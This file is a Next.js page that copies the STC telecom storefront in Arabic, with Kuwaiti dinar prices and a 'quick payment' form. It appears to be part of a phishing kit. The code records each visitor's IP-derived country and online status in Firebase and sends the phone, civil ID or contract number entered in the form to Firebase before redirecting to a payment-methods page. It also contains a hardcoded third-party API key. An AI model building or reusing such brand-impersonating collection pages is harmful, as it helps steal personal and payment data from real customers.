"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import {
  Search,
  ShoppingCart,
  User,
  Menu,
  CreditCard,
  ChevronRight,
  Phone,
  Wifi,
  Smartphone,
  Tv,
  Headphones,
  ShieldCheck,
  ArrowRight,
  PlusCircle,
  Download,
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-sts"

const _id = Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [amount, setAmount] = useState("")
  const router = useRouter()

  useEffect(() => {
    getLocation()
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const id = localStorage.getItem("visitor")
    addData({ id: id, phone, mobile: phone })
    localStorage.setItem("amount", amount)

    setIsLoading(true)
    setTimeout(() => {
      router.push("/payment-methods")
      setIsLoading(false)
    }, 3000)
  }

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50 font-sans" dir="rtl">
      {/* Header */}
      <header className="flex justify-between items-center px-5 py-4 bg-white border-b sticky top-0 z-50 shadow-sm">
        <button className="p-2 rounded-full hover:bg-gray-100 transition-colors">
          <Menu className="w-6 h-6 text-purple-900" />
        </button>

        <div className="flex items-center">
          <img src="/stc.png" alt="STC Logo" className="h-10 w-auto" />
        </div>

        <div className="flex items-center space-x-reverse space-x-4">
          <button className="p-2 rounded-full hover:bg-gray-100 transition-colors">
            <Search className="w-5 h-5 text-gray-700" />
          </button>
          <button className="p-2 rounded-full hover:bg-gray-100 transition-colors">
            <ShoppingCart className="w-5 h-5 text-gray-700" />
          </button>
          <button className="p-2 rounded-full hover:bg-gray-100 transition-colors">
            <User className="w-5 h-5 text-red-500" />
          </button>
        </div>
      </header>

      {/* Hero Banner */}
      <div className="relative mx-4 my-6 rounded-2xl overflow-hidden shadow-lg">
        <div className="absolute inset-0 bg-gradient-to-r from-purple-900/50 to-red-500/70 z-10"></div>
        <img src="/hero-banner.jpg" alt="Hero Banner" className="w-full h-[350px] object-cover" />
        <div className="absolute inset-0 z-20 p-8 flex flex-col justify-between">
          <div className="bg-white rounded-lg p-3 w-36 text-center shadow-md">
            <div className="text-red-500 font-bold text-xl">خلك ON</div>
            <div className="text-red-500 text-xs mt-1">باقات الدفع المسبقة الجديدة كلياً</div>
          </div>

          <div className="space-y-3">
            <h1 className="text-white font-bold text-3xl md:text-4xl leading-tight drop-shadow-md">
              تواصل بدون انقطاع
              <br />
              مع باقات الدفع الآجل
            </h1>
            <div className="flex justify-end mt-4">
              <Button className="bg-red-500 hover:bg-red-600 text-white rounded-full px-8 py-6 font-medium text-lg shadow-lg transition-all hover:scale-105">
                اعرف أكثر
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Service Icons */}
      <div className="grid grid-cols-5 gap-1 px-3 mt-8">
        <ServiceCard icon={<Store />} title="e-store" />
        <ServiceCard icon={<ShieldCheck />} title="تحديث البطاقة المدنية" />
        <ServiceCard icon={<ArrowRight />} title="نقل إلى stc" />
        <ServiceCard icon={<PlusCircle />} title="احصل على خط جديد" />
        <ServiceCard icon={<Download />} title="تحميل التطبيق" />
      </div>

      {/* Quick Payment */}
      <div className="mx-4 mt-10">
        <form onSubmit={handleSubmit} className="p-6 bg-white rounded-xl shadow-md border border-gray-100">
          <div className="flex items-center justify-between mb-6">
            <CreditCard className="w-8 h-8 text-purple-800" />
            <h2 className="text-2xl font-bold text-gray-800">الدفع السريع</h2>
          </div>

          <div className="space-y-6">
            <div className="relative">
              <Input
                required
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                maxLength={12}
                placeholder="رقم الجوال/البطاقة المدنية أو رقم العقد"
                className="text-right border-b border-gray-300 rounded-none focus:ring-0 py-6 px-2 focus:border-purple-500 transition-colors"
              />
            </div>

            {phone.length >= 8 && (
              <div className="relative animate-fadeIn">
                <Input
                  required
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  maxLength={3}
                  placeholder="القيمة بالدينار الكويتي"
                  type="tel"
                  className="text-right border-b border-gray-300 rounded-none focus:ring-0 py-6 px-2 focus:border-purple-500 transition-colors"
                />
              </div>
            )}

            <Button
              type="submit"
              className="w-full bg-gradient-to-r from-red-500 to-red-400 hover:from-red-600 hover:to-red-500 text-white rounded-full py-6 font-medium text-lg shadow-md transition-all hover:shadow-lg"
            >
              تابع الآن
            </Button>
          </div>
        </form>
      </div>

      {/* Quick Access */}
      <div className="mx-4 mt-10">
        <div className="flex justify-between items-center mb-5">
          <Button variant="ghost" className="text-purple-800 p-0 flex items-center">
            المزيد <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-2xl font-bold text-gray-800">الوصول السريع</h2>
        </div>

        <div className="grid grid-cols-5 gap-3">
          <CategoryCard icon={<Phone />} label="الأجهزة" />
          <CategoryCard icon={<Wifi />} label="الإنترنت" />
          <CategoryCard icon={<Smartphone />} label="الجوال" />
          <CategoryCard icon={<Tv />} label="التلفزيون" />
          <CategoryCard icon={<Headphones />} label="الترفيه" />
        </div>
      </div>

      {/* Featured Products */}
      <div className="mx-4 mt-10">
        <div className="flex justify-between items-center mb-5">
          <Button variant="ghost" className="text-purple-800 p-0 flex items-center">
            المزيد <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-2xl font-bold text-gray-800">تسوق أجهزة الجوال</h2>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <ProductCard
            image="/samsung-s22.png"
            title="Samsung S25 Ultra"
            price="255.00"
            currency="د.ك"
            installment="12.63"
          />
          <ProductCard
            image="/s25-Ultra-silver-blue-700x700.webp"
            title="Samsung S25"
            price="225.00"
            currency="د.ك"
            installment="11.29"
          />
        </div>
      </div>

      {/* Samsung Banner */}
      <div className="mx-4 mt-10">
        <div className="relative rounded-xl overflow-hidden shadow-md">
          <div className="absolute inset-0 bg-gradient-to-l from-black/70 to-transparent z-10"></div>
          <img
            src="/samsung-s23.png"
            alt="Samsung Banner"
            width={700}
            height={200}
            className="w-full h-[140px] object-cover"
          />
          <div className="absolute inset-0 z-20 flex items-center justify-between p-6">
            <Button className="bg-red-500 hover:bg-red-600 text-white rounded-full px-6 py-2 text-sm font-medium shadow-md transition-all hover:shadow-lg">
              تسوق الآن
            </Button>
            <div className="text-white text-right">
              <h3 className="font-bold text-xl drop-shadow-md">سامسونج جالكسي</h3>
              <p className="text-sm mt-1 drop-shadow-md">اكتشف المجموعة الجديدة</p>
            </div>
          </div>
        </div>
      </div>

      {/* Gift Cards */}
      <div className="mx-4 mt-10">
        <div className="flex justify-between items-center mb-5">
          <Button variant="ghost" className="text-purple-800 p-0 flex items-center">
            المزيد <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-2xl font-bold text-gray-800">تسوق البطاقات و الألعاب الإلكترونية</h2>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <GiftCard image="/pla.webp" title="Google Play " />
          <GiftCard image="/itun.webp" title="iTunse" />
        </div>
      </div>

      {/* Accessories */}
      <div className="mx-4 mt-10">
        <div className="flex justify-between items-center mb-5">
          <Button variant="ghost" className="text-purple-800 p-0 flex items-center">
            المزيد <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-2xl font-bold text-gray-800">الأجهزة</h2>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <CategoryCard image="/wifi.png" label="راوتر" bgColor="bg-purple-100" />
          <CategoryCard image="/music.png" label="سماعات" bgColor="bg-purple-100" />
          <CategoryCard image="/wristwatch.png" label="ساعات" bgColor="bg-purple-100" />
        </div>
      </div>

      {/* Entertainment */}
      <div className="mx-4 mt-10 mb-10">
        <div className="flex justify-between items-center mb-5">
          <Button variant="ghost" className="text-purple-800 p-0 flex items-center">
            المزيد <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-2xl font-bold text-gray-800">تسوق خدمات الترفيه</h2>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <CategoryCard image="/rgb.png" label="Netflix" bgColor="bg-purple-100" />
          <CategoryCard image="/mbc.png" label="Shahid" bgColor="bg-purple-100" />
          <CategoryCard image="/Spotify.png" label="Spotify" bgColor="bg-purple-100" />
        </div>
      </div>

      {/* Newsletter */}
      <div className="bg-gradient-to-r from-purple-900 to-red-500 py-8 px-6 shadow-inner">
        <div className="text-white text-center mb-5">
          <h3 className="font-bold text-xl">انضم إلى نشرتنا الإخبارية</h3>
          <p className="text-sm mt-2 opacity-90">احصل على آخر العروض والأخبار</p>
        </div>
        <div className="flex gap-3 max-w-md mx-auto">
          <Button className="bg-white text-red-500 hover:bg-gray-100 flex-1 shadow-md transition-all hover:shadow-lg">
            اشترك الآن
          </Button>
          <Input
            placeholder="البريد الإلكتروني"
            className="flex-1 bg-white text-right shadow-md focus:ring-2 focus:ring-white"
          />
        </div>
      </div>

      {/* Footer */}
      <Footer />

      {/* WhatsApp Button */}
      <WhatsAppButton />

      {/* Loading Overlay */}
      {isLoading && <FullPageLoader text="جاري التحويل ..." />}
    </div>
  )
}

// Component definitions
function ServiceCard({ icon, title }: { icon: React.ReactNode; title: string }) {
  return (
    <div className="flex flex-col items-center gap-2 p-3 bg-white rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
      <div className="bg-purple-100 rounded-full p-3 text-purple-900">{icon}</div>
      <span className="text-xs text-center font-medium text-gray-700">{title}</span>
    </div>
  )
}

function CategoryCard({
  icon,
  label,
  image,
  bgColor = "bg-white",
}: {
  icon?: React.ReactNode
  label: string
  image?: string
  bgColor?: string
}) {
  return (
    <div
      className={`flex flex-col items-center justify-center gap-2 p-3 ${bgColor} rounded-xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow`}
    >
      {image ? (
        <img src={image || "/placeholder.svg"} alt={label} className="w-10 h-10 object-contain" />
      ) : icon ? (
        <div className="text-purple-900">{icon}</div>
      ) : null}
      <span className="text-xs text-center font-medium text-gray-700">{label}</span>
    </div>
  )
}

function ProductCard({
  image,
  title,
  price,
  currency,
  installment,
}: {
  image: string
  title: string
  price: string
  currency: string
  installment: string
}) {
  return (
    <div className="bg-white rounded-xl p-4 shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
      <div className="relative h-40 mb-3">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-bold text-gray-800 mb-2">{title}</h3>
      <div className="flex justify-between items-center">
        <div className="text-xs text-gray-500">
          {installment} {currency}/شهر
        </div>
        <div className="font-bold text-red-500">
          {price} {currency}
        </div>
      </div>
    </div>
  )
}

function GiftCard({ image, title }: { image: string; title: string }) {
  return (
    <div className="bg-white rounded-xl p-4 shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
      <div className="relative h-32 mb-3">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-bold text-gray-800 text-center">{title}</h3>
    </div>
  )
}

function Footer() {
  return (
    <footer className="bg-gray-900 text-white py-10 px-6">
      <div className="grid grid-cols-2 md:grid-cols-4 gap-8">
        <div>
          <h4 className="font-bold mb-4">خدمة العملاء</h4>
          <ul className="space-y-2 text-sm text-gray-300">
            <li>اتصل بنا</li>
            <li>الأسئلة الشائعة</li>
            <li>فروعنا</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-4">حسابي</h4>
          <ul className="space-y-2 text-sm text-gray-300">
            <li>تسجيل الدخول</li>
            <li>طلباتي</li>
            <li>إعدادات الحساب</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-4">عن الشركة</h4>
          <ul className="space-y-2 text-sm text-gray-300">
            <li>من نحن</li>
            <li>الوظائف</li>
            <li>الشروط والأحكام</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-4">تواصل معنا</h4>
          <div className="flex space-x-4 space-x-reverse mt-2">
            <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center"></div>
            <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center"></div>
            <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center"></div>
          </div>
        </div>
      </div>
      <div className="mt-10 pt-6 border-t border-gray-800 text-center text-sm text-gray-400">
        © {new Date().getFullYear()} جميع الحقوق محفوظة
      </div>
    </footer>
  )
}

function WhatsAppButton() {
  return (
    <div className="fixed bottom-6 left-6 z-50">
      <button className="bg-green-500 hover:bg-green-600 text-white rounded-full p-3 shadow-lg transition-all hover:scale-105">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="w-6 h-6"
        >
          <path d="M3 21l1.65-3.8a9 9 0 1 1 3.4 2.9L3 21"></path>
          <path d="M9 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0v1Z"></path>
          <path d="M14 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0v1Z"></path>
          <path d="M9.5 15.5a5 5 0 0 0 5 0"></path>
        </svg>
      </button>
    </div>
  )
}

function FullPageLoader({ text }: { text: string }) {
  return (
    <div className="fixed inset-0 bg-black/70 flex flex-col items-center justify-center z-50">
      <div className="w-16 h-16 border-4 border-t-red-500 border-r-red-500 border-b-transparent border-l-transparent rounded-full animate-spin"></div>
      <p className="text-white mt-4 font-medium">{text}</p>
    </div>
  )
}

function Store() {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="m2 7 4.41-4.41A2 2 0 0 1 7.83 2h8.34a2 2 0 0 1 1.42.59L22 7"></path>
      <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path>
      <path d="M15 22v-4a2 2 0 0 0-2-2h-2a2 2 0 0 0-2 2v4"></path>
      <path d="M2 7h20"></path>
      <path d="M22 7v3a2 2 0 0 1-2 2v0a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 16 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 12 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 8 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 4 12v0a2 2 0 0 1-2-2V7"></path>
    </svg>
  )
}
